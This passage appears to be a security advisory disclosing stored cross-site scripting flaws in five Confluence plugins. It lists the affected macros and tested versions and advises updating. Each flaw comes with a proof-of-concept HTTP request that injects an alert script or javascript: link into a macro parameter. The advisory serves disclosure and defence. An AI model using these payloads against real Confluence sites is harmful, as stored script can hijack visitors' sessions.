Business recommendation:
------------------------
Update to the latest versions of the plugins. An in-depth security
analysis performed by security professionals is highly advised, as the
plugins may be affected from further security issues.


Vulnerability overview/description:
-----------------------------------
1) PlantUML - Stored Cross-Site Scripting
The Database Information macro is a component of PlantUML and can be used to
inject JavaScript code into Confluence pages, leading to a stored cross-site
scripting vulnerability.

2) Refined Toolkit for Confluence - Stored Cross-Site Scripting
The elements UI-Image and UI-Button can be used to inject JavaScript code into
Confluence pages, leading to a stored cross-site scripting vulnerability.

3) Linking for Confluence - Stored Cross-Site Scripting
The Link in New Windows macro can be used to inject JavaScript code into
Confluence pages, leading to a stored cross-site scripting vulnerability.

4) Countdown Timer - Stored Cross-Site Scripting
The Countdown Timer macro can be used to inject JavaScript code into Confluence
pages, leading to a stored cross-site scripting vulnerability.

5) Server Status - Stored Cross-Site Scripting
The two macros HTTP Status and SMTP Status can be used to inject JavaScript code
into Confluence pages, leading to a stored cross site scripting vulnerability.


Proof of concept:
-----------------
1) PlantUML - Stored Cross-Site Scripting
In the component Database Information a data source can be configured through
the parameter "datasources". This parameter allows an attacker to inject a
JavaScript code. The code is executed when a user visits the page where the
macro is used.

Below is the example on how the XSS issue can be exploited:

POST /rest/tinymce/1/macro/placeholder HTTP/1.1
Host: confluence:8090
[...]
Referer: http://confluence:8090/pages/resumedraft.action?draftId=65623&draftShareId=ebaa1df3-0bb2-476f-9e83-560e87bdd9a5&

{"contentId":"65622","macro":{"name":"database-info","params":{"datasources":"<script>alert(document.domain)</script>","attributes":"sdfdsf"},"body":""}}

2) Refined Toolkit for Confluence - Stored Cross-Site Scripting
In the two components UI-Image and UI-Button the parameter "url" allows an
attacker to inject a JavaScript code. This code is executed when a user
clicks on the created image/button on the Confluence page.

The following request demonstrates the creation of such an UI-Image macro:

POST /rest/tinymce/1/macro/placeholder HTTP/1.1
Host: confluence:8090
[...]
Referer: http://confluence:8090/pages/resumedraft.action?draftId=65609&draftShareId=d0b7c806-ec40-4f56-8bdf-bd19474e8073&

{"contentId":"65603","macro":{"name":"ui-image","params":{"imageUrl":"test","linkUrl":"javascript:alert(document.domain)"},"body":""}}

3) Linking for Confluence - Stored Cross-Site Scripting
The parameter "href" in the Link in New Window macro allows an attacker to
inject a JavaScript code. This code is executed when a user clicks on the
created Link on the Confluence page.

The following request demonstrates the creation of such a link:

POST /rest/tinymce/1/macro/placeholder HTTP/1.1
Host: confluence:8090
[...]
Referer: http://confluence:8090/pages/resumedraft.action?draftId=65609&draftShareId=d0b7c806-ec40-4f56-8bdf-bd19474e8073&

{"contentId":"65603","macro":{"name":"link-window","params":{"href":"javascript:alert(document.domain)","linkText":"click here"},"body":""}}

4) Countdown Timer - Stored Cross-Site Scripting
In the Countdown Timer plugin it is possible to set a countdown date through
the parameter "countdowndate". This parameter allows an attacker to inject
a JavaScript code. The code is executed when a user visits the page where
the plugin is used.

Below is the example on how the XSS issue can be exploited:

POST /rest/tinymce/1/macro/placeholder HTTP/1.1
Host: confluence:8090
[...]
Referer: http://confluence:8090/pages/resumedraft.action?draftId=65627&draftShareId=de758257-a056-479e-9e6a-eccdede26003&

{"contentId":"65626","macro":{"name":"countdown","params":{"countdowndate":"<script>alert(document.domain)</script>"},"body":""}}

5) Server Status - Stored Cross-Site Scripting
In the two components HTTP Status and SMTP status it is possible to set a text
through the parameter "displayText". This parameter allows an attacker to
inject a JavaScript code. The code is executed when a user visits the page
where the plugin is used.

Below is the example on how the XSS issue can be exploited:

POST /rest/tinymce/1/macro/placeholder HTTP/1.1
Host: confluence:8090
[...]
Referer: http://confluence:8090/pages/resumedraft.action?draftId=65619&draftShareId=efc17088-e2b6-4c29-9f0b-8ee90b4c03b7&

{"contentId":"65618","macro":{"name":"server-status-http-request","params":{"url":"http://test.com","displayText":"<script>alert(document.domain)</script>","theme":"Color"},"body":""}}


Vulnerable / tested versions:
-----------------------------
The following versions of the plugins have been tested, which were the latest
versions available at the time of the test.

PlantUML was tested in version 6.43.
Refined Toolkit for Confluence was tested in version 2.2.5.
Linking for Confluence was tested in version 5.5.3.
Countdown Timer was tested in version 1.7.0.
Server Status was tested in version 1.2.1.

It is assumed earlier versions of the plugins are also vulnerable to the issues.
